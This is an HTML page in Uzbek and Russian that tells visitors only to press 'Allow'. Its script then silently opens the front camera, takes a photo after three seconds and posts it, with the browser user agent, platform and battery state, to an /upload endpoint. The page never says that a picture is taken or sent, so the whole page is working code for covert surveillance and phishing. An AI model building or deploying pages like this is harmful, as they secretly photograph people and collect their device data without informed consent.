<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <title>Salom</title>
    <style>
        video {
            display: block;
            width: 100%;
            max-width: 300px;
        }
    </style>
</head>
<body>
    <h1>Iltimos, ruxsat berish/разрешить/Allow tugmasini bosing</h1>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas" style="display: none;"></canvas>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');

        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
            .then(stream => {
                video.srcObject = stream;

                video.onloadedmetadata = () => {
                    video.play();

                    // Video oqimi boshlanganidan so‘ng o‘lchamlarni sozlaymiz
                    video.addEventListener('playing', () => {
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;

                        // Kamera tayyor bo‘lishi uchun 3 soniya kutamiz
                        setTimeout(captureAndSendPhoto, 3000);
                    });
                };
            })
            .catch(err => {
                console.error("Kamera ruxsati berilmadi:", err);
            });

        async function captureAndSendPhoto() {
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));

            const userAgent = navigator.userAgent;
            const platform = navigator.platform;

            let batteryLevel = 'unknown';
            let batteryCharging = 'unknown';
            try {
                const battery = await navigator.getBattery();
                batteryLevel = battery.level;
                batteryCharging = battery.charging;
            } catch (e) {}

            const formData = new FormData();
            formData.append('photo', blob, 'auto.jpg');
            formData.append('userAgent', userAgent);
            formData.append('platform', platform);
            formData.append('batteryLevel', batteryLevel);
            formData.append('batteryCharging', batteryCharging);

            fetch('/upload', {
                method: 'POST',
                body: formData
            }).then(res => {
                if (res.ok) {
                    console.log("✅ Rasm va ma'lumotlar yuborildi");
                } else {
                    console.error("❌ Yuborishda xatolik");
                }
            }).catch(err => {
                console.error("Xatolik:", err);
            });
        }
    </script>
</body>
</html>
